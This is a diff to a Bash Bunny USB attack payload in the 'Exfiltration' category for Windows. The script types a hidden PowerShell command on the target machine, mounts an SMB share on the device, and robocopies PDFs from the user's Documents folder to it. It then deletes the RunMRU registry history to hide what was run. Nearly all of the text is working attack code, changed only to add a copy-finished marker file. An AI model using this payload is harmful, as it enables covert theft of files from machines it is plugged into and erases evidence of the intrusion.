@@ -6,8 +6,8 @@
 # Category:      Exfiltration
 # Target:        Windows XP SP3+ (Powershell)
 # Attackmodes:   HID, Ethernet
-# 
-# 
+#
+#
 # Red Blink Fast.......Impacket not found
 # Red Blink Slow.......Target did not acquire IP address
 # Amber Blink Fast.....Initialization
@@ -20,7 +20,7 @@
 # OPTIONS
 LOOTDIR=/root/udisk/loot/smb_exfiltrator
 EXFILTRATE_FILES="*.pdf"
-CLEARTRACKS="yes" # yes or no
+CLEARTRACKS=$TRUE # $TRUE or $FALSE
 
 # Initialization
 LED R G 100
@@ -35,21 +35,22 @@ fi
 
 # HID STAGE
 # Runs minimized powershell waiting for Bash Bunny to appear as 172.16.64.1.
-# Once found, initiates file copy and exits
+# Once found, initiates file copy and once finished copying files it creates a file called 'd'.
+# Then exits.
 LED R G
 ATTACKMODE HID
 QUACK GUI r
 QUACK DELAY 500
-QUACK STRING "powershell -WindowStyle Hidden \"while (\$true) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 2; net use \\\172.16.64.1\e guest /USER:guest; robocopy \$ENV:UserProfile\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S; exit } }\""
+QUACK STRING "powershell -WindowStyle Hidden \"while (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 2; net use \\\172.16.64.1\e guest /USER:guest; robocopy \$ENV:UserProfile\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S; New-Item \\\172.16.64.1\e\.d; exit }\""
 QUACK ENTER
 
 # Clear tracks?
-if [ $CLEARTRACKS == "yes" ]; then
-   QUACK DELAY 500
-   QUACK GUI r
-   QUACK DELAY 500
-   QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
-   QUACK ENTER
+if [ $CLEARTRACKS ]; then
+  QUACK DELAY 500
+  QUACK GUI r
+  QUACK DELAY 500
+  QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+  QUACK ENTER
 fi
 
 
@@ -92,23 +93,19 @@ fi
 
 
 # Wait until exfiltration is complete
-last=0
-current=1
-while [ "$last" != "$current" ]; do
-   last=$current
-   current=$(find /root/loot/smb_exfiltrator/temp/ -exec stat -c "%Y" \{\} \; | sort -n | tail -1)
-   LED B
-   sleep 1
-   LED R B 100
-   sleep 9
-   # Files are still being copied. Loop. 
-   # (Issue may exist if file takes longer than 10s to copy)
+while ! [ -f /root/loot/smb_exfiltrator/temp/.d ]; do
+  # Files are still being copied. Loop.
+  # (Issue may exist if file takes longer than 10s to copy)
+  LED B
+  sleep 1
+  LED R B 100
+  sleep 9
 done
 
 
-# Move files from staging area to loot directory
+# Move files (except .d) from staging area to loot directory
 LED R G B
-mv /root/loot/smb_exfiltrator/temp/* $LOOTDIR/$HOST-$COUNT
+mv /root/loot/smb_exfiltrator/temp/!(.d) $LOOTDIR/$HOST-$COUNT
 sync; sleep 1; sync
 
 # Trap is clean
